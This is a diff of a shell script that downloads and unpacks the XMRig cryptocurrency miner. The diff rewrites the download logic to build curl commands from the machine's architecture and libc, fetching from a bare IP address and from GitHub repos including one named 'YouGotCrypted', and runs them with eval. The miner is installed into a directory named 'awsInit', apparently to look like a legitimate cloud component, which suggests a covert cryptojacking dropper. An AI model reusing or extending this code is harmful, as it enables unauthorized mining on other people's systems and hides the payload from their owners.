@@ -248,53 +248,40 @@ echo "[*] Removing $working_dir/awsInit directory"
 rm -rf $working_dir/awsInit
 
 libc_type=$(check_system_libc)
+ARCH=$(uname -m)
 
-if [ "$libc_type" = "musl" ]; then
-    if [ -n "$TYPE" ]; then
-        if [ "$TYPE" = "custom" ]; then
-            echo "CUSTOM MUSL DOWNLOAD"
-            if ! curl -L --progress-bar "http://219.86.210.133:8090/file/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
-                echo "ERROR: cant't download http://219.86.210.133:8090/file/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
-                exit 1
-            fi
-        fi
-        if [ "$TYPE" = "raw6" ]; then
-            echo "Downloading RAW6 musl version"
-            if ! curl -L -6 --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
-                echo "ERROR: cant't download https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
-                exit 1
-            fi
-        fi
+if [ -n "$TYPE" ]; then
+    if [ "$TYPE" = "custom" ]; then
+        FIRST='curl -L --progress-bar "http://219.86.210.133:8090/file/"'
+    elif [ "$TYPE" = "raw6" ]; then
+        FIRST='curl -L -6 --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/"'
     else
-        echo "Downloading RAW musl version"
-        if ! curl -L --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
-            echo "ERROR: cant't download https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
-            exit 1
-        fi
+        echo "Unkown type: $TYPE"
+        exit 1
     fi
 else
-    if [ -n "$TYPE" ]; then
-        if [ "$TYPE" = "custom" ]; then
-            echo "CUSTOM GLIBC DOWNLOAD"
-            if ! curl -L --progress-bar "http://219.86.210.133:8090/file/xmrig-v6.25.0-mo1-lin64-compat.tar.gz" -o /tmp/data.tar.gz; then
-                echo "ERROR: cant't download http://219.86.210.133:8090/file/xmrig-v6.25.0-mo1-lin64-compat.tar.gz file to /tmp/data.tar.gz"
-                exit 1
-            fi
-        fi
-        if [ "$TYPE" = "raw6" ]; then
-            echo "Downloading RAW6 GLIBC version"
-            if ! curl -L -6 --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/data.tar.gz; then
-                echo "ERROR: cant't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
-                exit 1
-            fi
-        fi
-    else
-        echo "Downloading RAW GLIBC version"
-        if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/data.tar.gz; then
-            echo "ERROR: cant't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
-            exit 1
-        fi
-    fi
+    FIRST='curl -L --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/"'
+fi
+
+if [ "$ARCH" = "aarch64" ] && [ "$libc_type" = "musl" ]; then
+    SECOND="xmrig-musl-static-arm64.tar.gz -o /tmp/data.tar.gz"
+elif [ "$ARCH" = "aarch64" ] && [ "$libc_type" = "glibc" ]; then
+    echo "Not done yet"
+    exit 1
+elif [ "$ARCH" = "x86_64" ] && [ "$libc_type" = "musl" ]; then
+    SECOND="xmrig-musl-static-x64.tar.gz -o /tmp/data.tar.gz"
+elif [ "$ARCH" = "x86_64" ] && [ "$libc_type" = "glibc" ]; then
+    SECOND="xmrig.tar.gz -o /tmp/data.tar.gz"
+else
+    echo "Arquitecture or libc not supported: $ARCH / $libc_type"
+    exit 1
+fi
+
+COMMAND="$FIRST$SECOND"
+echo "[*] Downloading correct xmrig: $COMMAND"
+if ! eval "$COMMAND"; then
+    echo "Downloading xmrig failed"
+    exit 1
 fi
 
 echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
